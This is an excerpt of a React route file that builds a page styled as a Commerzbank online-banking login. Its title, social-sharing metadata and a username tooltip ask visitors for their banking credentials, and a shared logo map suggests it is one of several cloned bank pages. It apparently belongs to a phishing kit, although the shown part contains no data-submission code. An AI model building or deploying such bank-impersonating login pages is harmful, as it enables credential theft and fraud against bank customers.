...
export const Route = createFileRoute("/bank/commerzbank")({
  head: () => ({
    meta: [
      { title: "Commerzbank — Login" },
      { name: "description", content: "Melde dich bei der Commerzbank mit deinen Onlinebanking-Daten an." },
      { property: "og:title", content: "Commerzbank — Login" },
      { property: "og:description", content: "Melde dich bei der Commerzbank mit deinen Onlinebanking-Daten an." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: CommerzbankLoginPage,
});

function CommerzbankLoginPage() {
  const logo = bankLogoUrls["commerzbank"];
  ...
  return (
    <div className="min-h-screen bg-[#8a8a8a] p-0 sm:bg-neutral-100 sm:p-4">
      <div className="mx-auto flex w-[600px] max-w-full items-start justify-center">
        <div className="flex mt-6 h-[calc(100vh-1.5rem)] sm:mt-0 sm:h-[calc(100vh-2rem)] max-h-none sm:max-h-[1043px] w-full flex-col overflow-hidden bg-white rounded-t-[32px] sm:rounded-2xl shadow-xl">
          ...
          <div className="flex flex-1 flex-col overflow-y-auto px-8 pb-6 sm:px-10">
            ...
            <h1 className="mt-4 text-[24px] font-bold leading-tight text-[#0b051d]">Commerzbank</h1>
                ...
                <div className="relative flex h-[58px] items-center gap-2">
                  ...
                  <div className="group relative z-10">
                    ...
                    <div className="pointer-events-none absolute right-full top-1/2 z-50 mr-2 w-52 -translate-y-1/2 rounded-lg bg-black px-4 py-4 text-[16px] leading-relaxed text-white opacity-0 shadow-lg transition-opacity group-hover:opacity-100">
                      Bitte geben Sie Ihren Benutzername oder Teilnehmernummer ein
                    </div>
                  </div>
                </div>
              </div>
